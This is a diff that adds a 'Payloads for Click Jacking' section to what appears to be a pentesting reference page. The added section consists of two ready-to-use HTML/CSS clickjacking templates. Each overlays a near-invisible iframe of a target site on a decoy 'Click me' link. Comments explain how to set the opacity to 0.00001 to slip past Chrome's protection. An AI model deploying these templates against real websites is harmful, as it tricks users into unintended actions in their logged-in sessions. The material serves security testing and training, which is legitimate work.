@@ -52,3 +52,64 @@ Clickjacking presents a substantial threat to website security, enabling attacke
 ### Tutorials for Click Jacking
 
 ### Payloads for Click Jacking
+
+- Template for ClickJacking
+
+```
+<head>
+   <!-- Big up to https://portswigger.net/web-security/clickjacking labs :) -->
+   <style>
+      .target_website {
+      position:relative;
+      width:800px;
+      height:400px;
+      #Set opacity to 0.5 to see overlay allowing preparation of the attack 
+      #Set opacity to 0.00001 to made the target frame site transparent and bypass some browser protection on opacity like one in chrome for example
+      #See https://www.w3schools.com/css/css_image_transparency.asp
+      opacity:0.5;
+      z-index:2;
+      }
+      .decoy_website {
+      position:absolute;
+      width:800px;
+      height:400px;
+      z-index:1;
+      }
+   </style>
+</head>
+<body>
+   <div id="decoy_website" class="decoy_website"><a href="#" style="position: absolute; top: 787px; left: 35px;">Click me</a></div>
+   <iframe id="target_website" src="https://target.com/endpoint" class="target_website" sandbox="allow-forms"></iframe>
+</body>
+```
+
+- Construct a basic clickjacking attack
+
+```
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:128px;
+			height:128px;
+			opacity:0.00001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:300px;
+			height:400px;
+			z-index:1;
+			}
+	</style>
+</head>
+...
+<body>
+	<div id="decoy_website">
+	...decoy web content here...
+	</div>
+	<iframe id="target_website" src="https://vulnerable-website.com">
+	</iframe>
+</body>
+
+```
